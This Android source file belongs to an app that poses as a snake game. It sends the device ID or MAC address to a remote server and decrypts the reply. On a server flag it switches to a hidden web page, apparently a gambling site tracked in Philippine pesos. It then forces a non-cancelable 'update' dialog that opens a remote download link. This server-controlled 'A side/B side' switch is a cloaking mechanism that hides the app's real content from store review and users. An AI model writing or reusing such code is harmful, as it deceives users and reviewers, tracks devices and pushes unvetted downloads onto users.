package com.jilsfdivbvetwo.jlsat167;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.NotificationCompat;

import android.annotation.SuppressLint;
import android.app.Dialog;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.view.Window;
import android.webkit.JavascriptInterface;
import android.webkit.WebView;
import android.widget.RelativeLayout;
import android.widget.TextView;

import com.appsflyer.AFInAppEventParameterName;
import com.appsflyer.AppsFlyerLib;
import com.appsflyer.attribution.AppsFlyerRequestListener;
import com.blankj.utilcode.util.AppUtils;
import com.blankj.utilcode.util.DeviceUtils;
import com.blankj.utilcode.util.GsonUtils;
import com.blankj.utilcode.util.LogUtils;
import com.blankj.utilcode.util.RegexUtils;
import com.jilsfdivbvetwo.jlsat167.bean.DecryptDataResult;
import com.jilsfdivbvetwo.jlsat167.bean.StoneResult;
import com.jilsfdivbvetwo.jlsat167.snake.GameActivity;
import com.just.agentweb.AgentWeb;
import com.just.agentweb.DefaultWebClient;
import com.just.agentweb.WebChromeClient;
import com.just.agentweb.WebViewClient;
import com.kymjs.rxvolley.RxVolley;

import com.kymjs.rxvolley.client.HttpParams;
import com.kymjs.rxvolley.rx.Result;


import org.json.JSONObject;

import java.util.HashMap;
import java.util.Iterator;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;


import io.reactivex.rxjava3.android.schedulers.AndroidSchedulers;
import io.reactivex.rxjava3.core.Observable;

import io.reactivex.rxjava3.functions.Function;
import io.reactivex.rxjava3.schedulers.Schedulers;

public class LexdhActivity extends AppCompatActivity {

    MyWebView mWebView;
    private DecryptDataResult mDecryptDataResult;
    private RelativeLayout mRl_b;
    private AgentWeb mAgentWeb;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        init();

    }


    private final void init() {
        initFeature();
        checkLoadType();

    }

    private final void initFeature() {
        requestWindowFeature(1);
        getWindow().setFlags(1024, 1024);
        getWindow().setBackgroundDrawable(null);
        setContentView(R.layout.layout_main);


    }

    @SuppressLint("CheckResult")
    private final void checkLoadType() {
        LogUtils.dTag("checkLoadType", "请求开始");
        HttpParams httpParams = new HttpParams();

        httpParams.put("appkey", LexdhApplication.appKey);
        httpParams.put("device_number", getAndroidID());

        Observable<Result> observable = new RxVolley.Builder()
                .url(LexdhApplication.appUrl + AppUtils.getAppName())
                .params(httpParams)
                .contentType(RxVolley.ContentType.FORM)
                .httpMethod(RxVolley.Method.POST)
                .getResult();

        observable.map(new Function<Result, StoneResult>() {
                    @Override
                    public StoneResult apply(Result result) throws Throwable {
                        String t = new String(result.data);
                        StoneResult stoneResult = GsonUtils.fromJson(t, StoneResult.class);
                        return stoneResult;
                    }
                })
                .subscribeOn(Schedulers.io())
                .observeOn(AndroidSchedulers.mainThread())
                .subscribe(s -> {
                            if (s != null && s.getCode() == 0 && s.getMsg().equals("Succeeded")) {
                                //返回成功
                                LogUtils.dTag("Msg", s.toString());

                                String data = s.getData();
                                String replaceAll = RegexUtils.getReplaceAll(data, "\\\\", "");
                                LogUtils.dTag("RegexUtils", replaceAll);

                                String decrypt = Decrypt(replaceAll, LexdhApplication.appSecret);
                                LogUtils.dTag("Decrypt", decrypt);

                                mDecryptDataResult = GsonUtils.fromJson(decrypt, DecryptDataResult.class);
                                LogUtils.dTag("decryptDataResult", mDecryptDataResult);

                                //TODO 上线:测试B面
                                if (mDecryptDataResult != null && mDecryptDataResult.getIswap() == 1 && !mDecryptDataResult.getWapurl().isEmpty() /*true*/) {
                                    //跳转h5
                                    LogUtils.dTag(this.getLocalClassName(), "start B");
                                    setContentView(R.layout.layout_web);
                                    mRl_b = findViewById(R.id.rl_b);
                                    mRl_b.setVisibility(View.VISIBLE);
                                    LexdhApplication.updateVersion = mDecryptDataResult.getVersion();
                                    LexdhApplication.downloadUrl = mDecryptDataResult.getDownurl();

                                    //TODO 上线:测试B面
//                                    LexdhApplication.updateVersion = 2;
//                                    mDecryptDataResult.setWapurl("https://777ku.com");

                                    initWebView();
                                } else {
                                    //不跳转,进入A面
//                                    setContentView(R.layout.layout_a);
                                    Intent intent = new Intent(this, GameActivity.class);
                                    startActivity(intent);
                                    finish();
                                    LogUtils.dTag(this.getLocalClassName(), "start A");

                                }

                            } else {
                                //返回失败 进入A面
                                setContentView(R.layout.layout_a);
                                LogUtils.dTag(this.getLocalClassName(), "start A");

                            }

                        }, throwable -> {
                            LogUtils.dTag(" ---- request HostUrl Error start A----" + throwable.toString());
                            setContentView(R.layout.layout_a);
                        }
                );

    }

    private void initWebView() {
        MyJavaScriptInterface myJavaScriptInterface = new MyJavaScriptInterface(this);
        mAgentWeb = AgentWeb.with(this)
                .setAgentWebParent(mRl_b, new RelativeLayout.LayoutParams(-1, -1))
                .useDefaultIndicator()
                .setWebChromeClient(new WebChromeClient())
                .setWebViewClient(new WebViewClient())
                .addJavascriptInterface("jsBridge", myJavaScriptInterface)
                .setSecurityType(AgentWeb.SecurityType.STRICT_CHECK)
                .setOpenOtherPageWays(DefaultWebClient.OpenOtherPageWays.ASK)//打开其他应用时，弹窗咨询用户是否前往其他应用
                .interceptUnkownUrl() //拦截找不到相关页面的Scheme
                .createAgentWeb()
                .ready()
                .go(mDecryptDataResult.getWapurl());

      /*  mWebView = findViewById(R.id.webView);
        MyJavaScriptInterface myJavaScriptInterface = new MyJavaScriptInterface(this);
        mWebView.addJavascriptInterface(myJavaScriptInterface, "jsBridge");
        mWebView.loadUrl(mDecryptDataResult.getWapurl());*/

        if (LexdhApplication.updateVersion <= 1 || TextUtils.isEmpty(LexdhApplication.downloadUrl)) {
            return;
        }
//        download(LexdhApplication.downloadUrl);
        initUpdate();
    }

    private void initUpdate() {
        Dialog dialog = new Dialog(this);
        View inflate = LayoutInflater.from(this).inflate(R.layout.update_version_dialog, (ViewGroup) null);
        Window window = dialog.getWindow();
        Window window2 = dialog.getWindow();
        if (window2 != null) {
            window2.setBackgroundDrawableResource(R.color.transparent);
        }
        if (window != null) {
            window.setDimAmount(0.5f);
        }
        ((TextView) inflate.findViewById(R.id.tv_update_desc)).setText("A new version needs to be updated");
        ((TextView) inflate.findViewById(R.id.btn_update)).setOnClickListener(new View.OnClickListener() { // from class: f.a
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
                startActivity(new Intent("android.intent.action.VIEW", Uri.parse(LexdhApplication.downloadUrl)));
            }
        });
        dialog.setContentView(inflate);
        dialog.setCancelable(false);
        dialog.setCanceledOnTouchOutside(false);
        dialog.show();

    }


/*    private void download(String downloadUrl) {

        findViewById(R.id.updateLayout).setVisibility(View.VISIBLE);
        findViewById(R.id.updateLayout).setOnClickListener(new View.OnClickListener() { // from class: com.wildseven.wlsn105.common.webview.WebPage$$ExternalSyntheticLambda0
            @Override // android.view.View.OnClickListener
            public final void onClick(View view) {
//                startActivity(new Intent("android.intent.action.VIEW", Uri.parse(downloadUrl)));
            }
        });
        findViewById(R.id.btn_update).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                startActivity(new Intent("android.intent.action.VIEW", Uri.parse(downloadUrl)));
            }
        });


    }*/

    public class MyJavaScriptInterface {
        Context mContext;

        MyJavaScriptInterface(Context c) {
            this.mContext = c;
        }

        @JavascriptInterface
        public void postMessage(String str) {
            LogUtils.dTag("WebActivity", "postMessage = " + str);
            HashMap hashMap = new HashMap();
            hashMap.put(NotificationCompat.CATEGORY_EVENT, str);
            hashMap.put(AFInAppEventParameterName.CONTENT_ID, str);
            hashMap.put(AFInAppEventParameterName.CONTENT_TYPE, str);
            AppsFlyerLib.getInstance().logEvent(mContext, str, hashMap, new AppsFlyerRequestListener() { // from class: com.wildseven.wlsn105.common.webview.WebPage.MessageInterface.1
                @Override // com.appsflyer.attribution.AppsFlyerRequestListener
                public void onSuccess() {
                    Log.d("WebActivity", "Event sent successfully");
                }

                @Override // com.appsflyer.attribution.AppsFlyerRequestListener
                public void onError(int i, String str2) {
                    Log.e("WebActivity", "Event failed to be sent:\nError code: " + i + "\nError description: " + str2);
                }
            });
        }

        @JavascriptInterface
        public void postMessage(String str, String str2) {
            final HashMap hashMap = new HashMap();
            hashMap.put(NotificationCompat.CATEGORY_EVENT, str);
            String str3 = "0";
            try {
                JSONObject jSONObject = new JSONObject(str2);
                Iterator<String> keys = jSONObject.keys();
                while (keys.hasNext()) {
                    String next = keys.next();
                    if ("amount".equals(next)) {
                        str3 = jSONObject.getString(next);
                        hashMap.put(next, Double.valueOf(jSONObject.getDouble(next)));
                    } else {
                        hashMap.put(next, jSONObject.getString(next));
                    }
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
            LogUtils.dTag("WebActivity", "postMessage = " + str + " - " + hashMap);
            hashMap.put(AFInAppEventParameterName.CONTENT_ID, str);
            hashMap.put(AFInAppEventParameterName.CONTENT_TYPE, str);
            hashMap.put(AFInAppEventParameterName.REVENUE, str3);
            hashMap.put(AFInAppEventParameterName.CURRENCY, "PHP");

            AppsFlyerLib.getInstance().logEvent(mContext, str, hashMap, new AppsFlyerRequestListener() { // from class: com.wildseven.wlsn105.common.webview.WebPage.MessageInterface.2
                @Override // com.appsflyer.attribution.AppsFlyerRequestListener
                public void onSuccess() {
                    Log.d("WebActivity", "Event sent successfully");
                }

                @Override // com.appsflyer.attribution.AppsFlyerRequestListener
                public void onError(int i, String str4) {
                    Log.e("WebActivity", "Event failed to be sent:\nError code: " + i + "\nError description: " + str4);
                }
            });
            if ("openWindow".equals(str)) {
  /*              WebPage.this.runOnUiThread(new Runnable() { // from class: com.wildseven.wlsn105.common.webview.WebPage$MessageInterface$$ExternalSyntheticLambda0
                    @Override // java.lang.Runnable
                    public final void run() {
                        WebPage.MessageInterface.this.m100xc84ec31e(hashMap);
                    }
                });*/
            }
        }


    }

    @Override
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (mAgentWeb != null){
            mAgentWeb.back();
        }
        return false;
/*        boolean z = false;
        LogUtils.dTag(getLocalClassName(), "onKeyDown: ", Integer.valueOf(i), keyEvent);
        if (i != 4) {
            return false;
        }
        WebView webView = this.mWebView;
        if (webView != null && webView.canGoBack()) {
            z = true;
        }
        if (z) {
            WebView webView2 = this.mWebView;
            if (webView2 != null) {
                webView2.goBack();
            }
        } else {
            finish();
        }
        return true;*/
    }


    private final String getAndroidID() {
        String str;
        if (DeviceUtils.getUniqueDeviceId() != "" && DeviceUtils.getUniqueDeviceId() != null) {
            str = DeviceUtils.getUniqueDeviceId();
        } else {
            str = DeviceUtils.getMacAddress() + DeviceUtils.getAndroidID();
        }
        LogUtils.dTag("getAndroidID", str);
        return str;
    }

    public static String Decrypt(String content, String pwd) {

        try {
            if (pwd == null && pwd.length() != 16) {
                LogUtils.dTag("Decrypt", "密钥不正确");
                return null;
            }

            byte[] raw = pwd.getBytes("utf-8");
            SecretKeySpec secretKeySpec = new SecretKeySpec(raw, "AES");

            Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
            cipher.init(Cipher.DECRYPT_MODE, secretKeySpec);
            byte[] encrypted1 = Base64.decode(content, Base64.DEFAULT);
            byte[] original = cipher.doFinal(encrypted1);
            String originalString = new String(original, "utf-8");
            return originalString;

        } catch (Exception e) {
            LogUtils.dTag("Exception", e);
            return null;
        }


    }

}